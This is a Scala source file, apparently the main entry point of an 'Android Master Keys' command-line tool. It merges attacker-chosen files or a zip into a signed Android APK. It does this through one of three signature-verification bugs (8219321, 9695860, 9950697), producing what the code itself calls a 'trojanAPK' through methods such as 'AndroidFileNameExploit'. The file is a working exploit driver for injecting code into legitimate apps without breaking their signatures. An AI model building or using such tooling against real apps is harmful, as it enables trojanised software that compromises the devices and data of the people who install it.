package android.master.keys

import java.io.File
import utils.{FileEntry, ZipFile}
import scala.util._
import org.apache.commons.compress.archivers.zip.ZipArchiveEntry
import android.master.keys.MasterKeysAPK
import utils.FileHelper._
import android.master.keys.Config
import scala.Some
import android.master.keys.Config
import scala.Some

case class Config(origAPK:Option[File] = None,
                  bug8219321:Boolean = false,
                  bug9695860:Boolean = false,
                  bug9950697:Boolean = true,
                  mergeZip:Option[File] = None,
                  out:Option[File] = None,
                  files: Seq[File] = Seq())

object Main extends App {

  val parser = new scopt.OptionParser[Config]("Android Master Keys") {
    head("Android Master Keys", "1.1")
    opt[File]('a', "apk") required() valueName("<file>") action { (x, c) =>
      c.copy(origAPK = Some(x)) } text("path to original APK")
    opt[File]('z', "zip") valueName("<zipFile>") action { (x, c) =>
      c.copy(mergeZip = Some(x)) } text("Merge files from this zip into original APK")
    opt[File]('o', "out") valueName("<file>") action { (x, c) =>
      c.copy(out = Some(x)) } text("output APK path")
    opt[Unit]("8219321") optional() action {(x,c) => c.copy(bug8219321 = true)} text("Use bug 8219321 (uses 9950697 by default)")
    opt[Unit]("9695860") optional() action {(x,c) => c.copy(bug9695860 = true)} text("Use bug 9695860 (uses 9950697 by default)")
    arg[File]("<file>...") unbounded() optional() action { (x, c) =>
      c.copy(files = c.files :+ x) } text("Files to merge into zip")
    help("help") text("prints this usage text")
  }

  parser.parse(args, Config()) map { config =>
    import utils.FileHelper._

   if(!config.files.isEmpty && config.mergeZip.isDefined)
   {
     println("Currently, cannot define files to inject as well as a zip to inject")
     exit(-1)
   } else if(config.files.isEmpty && !config.mergeZip.isDefined ){
     println("You must either specify files to add or a zip to merge")
   }

   val mergeAPK:Try[MasterKeysAPK] =
     if(!config.files.isEmpty)
          MasterKeysAPK(config.files,     original = false)
     else MasterKeysAPK(config.mergeZip,  original = false)

   for {
     ogAPK     <- MasterKeysAPK(config.origAPK.get, original = true)
     trojanAPK <- mergeAPK
   }{
     val outFilePath = config.out match {
       case Some(o) => o.getAbsolutePath
       case None =>   "MasterKeysModded-" +config.origAPK.get.getName
     }

     val fileBytes =
      if(config.bug9695860) ogAPK.centralDirectoryOverlap(trojanAPK).getZipFileBytes
      else if(config.bug8219321) ogAPK.hashNormalizedMerge(trojanAPK).getZipFileBytes
      else { //Bug 9950697
           ogAPK.AndroidFileNameExploit(trojanAPK).getZipFileBytes
      }

     writeFile(outFilePath, fileBytes)
   }

  } getOrElse {
    // arguments are bad, usage message will have been displayed
  }

  def printZip(fileName:String){
    ZipFile(fileName) map { z =>
      val entries = z.map(_.zEntry.asInstanceOf[ZipArchiveEntry])
      entries.sortBy(_.getSize).map(e => println(s"${e.getName}\t${e.getSize}\t${e.getMethod}\t${e.getCrc}\t${e.getCompressedSize}"))
    }
  }

}
